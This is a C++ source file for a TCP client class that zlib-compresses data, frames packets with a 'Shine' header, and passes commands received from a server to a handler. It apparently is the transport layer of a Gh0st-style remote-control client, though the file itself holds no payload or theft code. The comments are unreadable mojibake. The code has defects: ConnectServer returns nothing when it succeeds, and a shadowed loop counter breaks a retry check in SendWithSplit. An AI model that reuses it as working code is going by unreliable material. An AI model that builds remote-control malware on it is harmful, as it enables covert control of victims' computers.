#include "pch.h"
#include "IocpClient.h"
int CIocpClient::OnSending(char* BufferData, ULONG BufferLength)
{
	m_SendCompressedBufferData.ClearArray();

	if (BufferLength > 0)
	{
		//��13���ֽ��ǲ�����ѹ����    
		unsigned long	CompressedLength = (double)BufferLength * 1.001 + 12;   //100 * 1.001 + 12
		LPBYTE			CompressedData = new BYTE[CompressedLength];   //��̬�����ڴ�

		if (CompressedData == NULL)
		{
			return 0;
		}
		//΢��Ĺٷ����
		int	IsOk = compress(CompressedData, &CompressedLength, (PBYTE)BufferData, BufferLength);

		if (IsOk != Z_OK)
		{
			//����ѹ��ʧ��
			delete[] CompressedData;   //�����ڴ�
			return FALSE;
		}

		//�������ݰ��ܳ�
		ULONG PackTotalLength = CompressedLength + PACKET_HEADER_LENGTH;
		m_SendCompressedBufferData.WriteArray((PBYTE)m_PacketHeaderFlag, sizeof(m_PacketHeaderFlag));
		//Shine
		m_SendCompressedBufferData.WriteArray((PBYTE)&PackTotalLength, sizeof(ULONG));
		//ShinePackTotalLength
		m_SendCompressedBufferData.WriteArray((PBYTE)&BufferLength, sizeof(ULONG));
		//ShinePackTotalLengthBufferLength
		m_SendCompressedBufferData.WriteArray(CompressedData, CompressedLength);
		//[Shine][PackTotalLength][BufferLength][........(ѹ�������ʵ����)]

		delete[] CompressedData;   //�����ڴ�
		CompressedData = NULL;

	}

	//�ֶη�������
	return SendWithSplit((char*)m_SendCompressedBufferData.GetArray(),
		m_SendCompressedBufferData.GetArrayLength(),
		MAX_SEND_BUFFER);
}
//�и��
BOOL CIocpClient::SendWithSplit(char* BufferData, ULONG BufferLength, ULONG SplitLength)
{
	int			 ReturnLength = 0;
	const char* Travel = (char*)BufferData;
	int			 i = 0;
	ULONG		 Sended = 0;
	ULONG		 SendRetry = 15;
	int          j = 0;

	for (i = BufferLength; i >= SplitLength; i -= SplitLength)
	{
		for (j = 0; j < SendRetry; j++)  //ȷ������ÿ���ܹ��ɹ� ��ÿһ�����ݵ�15�η���
		{
			ReturnLength = send(m_ClientSocket, Travel, SplitLength, 0);   //ͬ������
			if (ReturnLength > 0)
			{
				break;//���ͳɹ� �˳��ö����ݵķ���
			}
		}
		if (j == SendRetry)
		{
			return FALSE;   //�궿��
		}

		Sended += SplitLength;
		Travel += ReturnLength;
		Sleep(15);
	}
	//0x9000  0x2000   2000 2000 2000 2000 1000
	if (i > 0)
	{
		for (int j = 0; j < SendRetry; j++)
		{
			ReturnLength = send(m_ClientSocket, (char*)Travel, i, 0);

			Sleep(15);
			if (ReturnLength > 0)
			{
				break;
			}
		}
		if (j == SendRetry)
		{
			return FALSE;
		}
		Sended += ReturnLength;
	}
	if (Sended == BufferLength)
	{
		return TRUE;   //�������ݷ������
	}
	else
	{
		return FALSE;
	}
}

CIocpClient::CIocpClient()
{
	//��ʼ���׽������
	WSADATA v1;
	if (WSAStartup(MAKEWORD(2, 2), &v1) != 0)
	{
		return;
	}

	//ͨ���׽���
	m_ClientSocket = INVALID_SOCKET;
	memcpy(m_PacketHeaderFlag, "Shine", PACKET_FLAG_LENGTH);
	m_WorkThreadHandle = NULL;
	m_EventHandle = CreateEvent(NULL, TRUE, FALSE, NULL);
}

CIocpClient::~CIocpClient()
{

	if (m_ClientSocket != INVALID_SOCKET)
	{
		closesocket(m_ClientSocket);
		m_ClientSocket = INVALID_SOCKET;
	}

	//�رչ����߳̾��
	if (m_WorkThreadHandle != NULL)
	{
		CloseHandle(m_WorkThreadHandle);
		m_WorkThreadHandle = NULL;
	}
	//�ر��¼�
	if (m_EventHandle != NULL)
	{
		CloseHandle(m_EventHandle);
		m_EventHandle = NULL;
	}


	WSACleanup();
}
BOOL CIocpClient::ConnectServer(char* ServerAddress, unsigned short ConnectPort)
{
	//����һ��ͨ���׽���
	m_ClientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (m_ClientSocket == SOCKET_ERROR)
	{
		return FALSE;
	}
	//����sockaddr_in�ṹҲ����Server��IPAddress�ṹ
	//��ʼ������������
	sockaddr_in	v1;
	v1.sin_family = AF_INET;
	v1.sin_port = htons(ConnectPort);
 	v1.sin_addr.S_un.S_addr = inet_addr(ServerAddress);
	//���ӷ�����
  	if (connect(m_ClientSocket, (SOCKADDR*)&v1, sizeof(sockaddr_in)) == SOCKET_ERROR)
	{
		int LastError = WSAGetLastError();
		if (m_ClientSocket != INVALID_SOCKET)
		{
 			closesocket(m_ClientSocket);
			m_ClientSocket = INVALID_SOCKET;
		}
		return FALSE;
	}

	//���������ͻ��˵�����
		m_WorkThreadHandle = (HANDLE)CreateThread(NULL, 0,
			(LPTHREAD_START_ROUTINE)WorkThreadProcedure, (LPVOID)this, 0, NULL);   //��������

}
VOID CIocpClient::Disconnect()
{
	CancelIo((HANDLE)m_ClientSocket);           //ȡ����ǰ����������û����ɵ��첽IO����
	InterlockedExchange((LPLONG)&m_IsReceiving, FALSE);   //֪ͨ�����߳��˳����ź�
	closesocket(m_ClientSocket);                          //�ᴥ���Է�����-1����
	SetEvent(m_EventHandle);       //
	m_ClientSocket = INVALID_SOCKET;
}
DWORD WINAPI CIocpClient::WorkThreadProcedure(LPVOID ParameterData)
{
	CIocpClient* v1 = (CIocpClient*)ParameterData;
	//ͨ��ģ�ͣ�ѡ��ģ��

	//�����׽��ּ���
	fd_set OldSocketSet;
	fd_set NewSocketSet;
	FD_ZERO(&OldSocketSet);
	FD_ZERO(&NewSocketSet);
	//���������ڴ�
	char BufferData[PACKET_LENGTH] = { 0 };

	//������ͨ���׽��ַ��뵽������
	FD_SET(v1->m_ClientSocket, &OldSocketSet);

	while (v1->IsReceiving())
	{
		NewSocketSet = OldSocketSet; 
		//���������û�����ݷ��͸��ͻ��˽�������select������
		int IsOk = select(NULL, &NewSocketSet, NULL, NULL, NULL);   //�������������û���κ��źţ����벻������ִ�У�

		if (IsOk == SOCKET_ERROR)   //������������
		{
			v1->Disconnect();
			_tprintf(_T("IsReceiving�ر�\r\n"));
			break;

		}
		if (IsOk > 0)
		{
			//�׽��ּ����е��׽��ֵõ������� ���ݵ���
			memset(BufferData, 0, sizeof(BufferData));
			//�������ض˷���������
			int BufferLength = recv(v1->m_ClientSocket, BufferData, sizeof(BufferData), 0);
			if (BufferLength <= 0)      //һ���������ر��׽��� �ͻ��յ�0���ȵ�BufferLength
			{
				_tprintf(_T("WorkThreadProcedure(�������ݣ������ض˹ر�����\r\n"));
				v1->Disconnect();
				break;

			}
			if (BufferLength > 0)
			{
				v1->OnReceiving((char*)BufferData, BufferLength);   //��������
			}
		}
	}
	return 0;
}
VOID CIocpClient::OnReceiving(char* BufferData, ULONG BufferLength)
{
	//�ӵ������ݽ��н�ѹ��
	try
	{
		if (BufferLength == 0)
		{
			Disconnect();       //������
			return;
		}
		//�����յ������ݴ洢��m_ReceivedCompressedBufferData
		m_ReceivedCompressedBufferData.WriteArray((LPBYTE)BufferData, BufferLength);

		//��������Ƿ��������ͷ��С��������ǾͲ�����ȷ������
		while (m_ReceivedCompressedBufferData.GetArrayLength() > PACKET_HEADER_LENGTH)
		{
			char v1[PACKET_FLAG_LENGTH] = { 0 };
			CopyMemory(v1, m_ReceivedCompressedBufferData.GetArray(), PACKET_FLAG_LENGTH);
			//�ж�����ͷ
			if (memcmp(m_PacketHeaderFlag, v1, PACKET_FLAG_LENGTH) != 0)
			{
				throw "Bad Buffer";
			}

			ULONG PackTotalLength = 0;
			CopyMemory(&PackTotalLength, m_ReceivedCompressedBufferData.GetArray(PACKET_FLAG_LENGTH),
				sizeof(ULONG));

			//���ݵĴ�С��ȷ�ж�
			if (PackTotalLength &&
				(m_ReceivedCompressedBufferData.GetArrayLength()) >= PackTotalLength)
			{


				m_ReceivedCompressedBufferData.ReadArray((PBYTE)v1, PACKET_FLAG_LENGTH);

				m_ReceivedCompressedBufferData.ReadArray((PBYTE)&PackTotalLength, sizeof(ULONG));

				ULONG DecompressedLength = 0;
				m_ReceivedCompressedBufferData.ReadArray((PBYTE)&DecompressedLength, sizeof(ULONG));


				ULONG CompressedLength = PackTotalLength - PACKET_HEADER_LENGTH;
				PBYTE CompressedData = new BYTE[CompressedLength];
				PBYTE DecompressedData = new BYTE[DecompressedLength];


				if (CompressedData == NULL || DecompressedData == NULL)
				{
					throw "Bad Allocate";

				}

				m_ReceivedCompressedBufferData.ReadArray(CompressedData, CompressedLength);
				int	IsOk = uncompress(DecompressedData,
					&DecompressedLength, CompressedData, CompressedLength);


				if (IsOk == Z_OK)//�����ѹ�ɹ�
				{
					m_ReceivedDecompressedBufferData.ClearArray();
					m_ReceivedDecompressedBufferData.WriteArray(DecompressedData,
						DecompressedLength);


					delete[] CompressedData;
					delete[] DecompressedData;



					//MessageBox(NULL, 0, 0, 0);
					//�����̬
					m_Manager->HandleIo((PBYTE)m_ReceivedDecompressedBufferData.GetArray(0),
						m_ReceivedDecompressedBufferData.GetArrayLength());
				}
				else
				{
					delete[] CompressedData;
					delete[] DecompressedData;
					throw "Bad Buffer";
				}

			}
			else
				break;
		}
	}
	catch (...)
	{
		m_ReceivedCompressedBufferData.ClearArray();
		m_ReceivedDecompressedBufferData.ClearArray();
	}




}